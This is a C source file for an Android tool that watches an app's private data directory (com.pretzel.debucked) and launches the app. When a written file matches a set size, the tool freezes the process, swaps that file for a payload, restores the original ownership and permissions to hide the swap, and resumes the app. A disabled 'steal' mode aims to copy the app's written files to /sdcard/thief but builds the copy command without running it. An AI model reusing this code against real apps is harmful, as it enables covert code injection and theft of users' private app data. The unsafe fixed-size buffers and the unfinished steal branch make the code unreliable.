/*
    Copyright (C) <2016>  <tslater2006>

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
*/
    
#include <sys/stat.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <inotifytools/inotifytools.h>
#include <inotifytools/inotify.h>

#define PACKAGE_NAME "com.pretzel.debucked"
#define FILE_SIZE  951313
#define STARTUP_ACTIVITY  "com.pretzel.debucked.ui.HomeActivity"
#define PAYLOAD_PATH "/data/local/tmp/debucked.bin"
#define STEAL_FILES false
#define STEAL_PATH "/sdcard/thief"

int main() {
	char command[255];

	if ( !inotifytools_initialize()
	  || !inotifytools_watch_recursively( "/data/data/com.pretzel.debucked", IN_ALL_EVENTS ) ) {
		fprintf(stderr, "%s\n", strerror( inotifytools_error() ) );
		return -1;
	}
	printf("Starting Application: %s\n", STARTUP_ACTIVITY);
	/* Start the application */
	sprintf(command, "am start -n %s/%s", PACKAGE_NAME, STARTUP_ACTIVITY);
	system(command);
	int index = 0;

	/* get the PID of the application */
	int androidAppPID = 0;
	sprintf(command, "ps | grep %s | awk '{print $2; }'", PACKAGE_NAME);
	FILE *fp = popen(command, "r");
	fscanf(fp, "%d", &androidAppPID);
	pclose(fp);

	printf("Process ID: %i\n", androidAppPID);

	// Start watching for all events
	struct inotify_event * event = inotifytools_next_event( -1 );
	while ( event ) {
		/* If a writable file was closed */
		if (event->mask & IN_CLOSE_WRITE) {

			/* get full filepath */
			char filepath[255];
			sprintf(filepath, "%s%s",inotifytools_filename_from_wd( event->wd ), event->name);

			if (STEAL_FILES) {
				/* copy the file to the steal path */
				printf("Stealing file: %s", filepath);
				sprintf (command, "cp %s %s/%i_%s", filepath, STEAL_PATH, ++index, event->name);
			} else {
				/* we are in replacing mode */
				/* Get file size, mode and owner/group */
				struct stat st;
				stat(filepath, &st);

				int size = st.st_size;
				uid_t userid = st.st_uid;
				gid_t group = st.st_gid;
				mode_t mode = st.st_mode;

				/* does this file match in size ? */
				if (size == FILE_SIZE) {
					
					/* suspend the process */
					kill(androidAppPID, SIGSTOP);

					/* remove old, copy in new */
					sprintf(command, "rm %s && cp %s %s", filepath, PAYLOAD_PATH, filepath);
					printf("\nSwapping file...:\n");
					system(command);

					/* set permission to how they were */
					printf("Chaning permissions...");
					chown(filepath, userid, group);
					chmod(filepath, mode);

					/* pause for a while to let all IO finish */
					sleep(1);

					/* Continue the process */
					kill(androidAppPID, SIGCONT);

					/* we don't care about any other events, so exit the loop */
					break;
				}
			}
		}
		event = inotifytools_next_event( -1 );
	}


	printf("All done!");
}



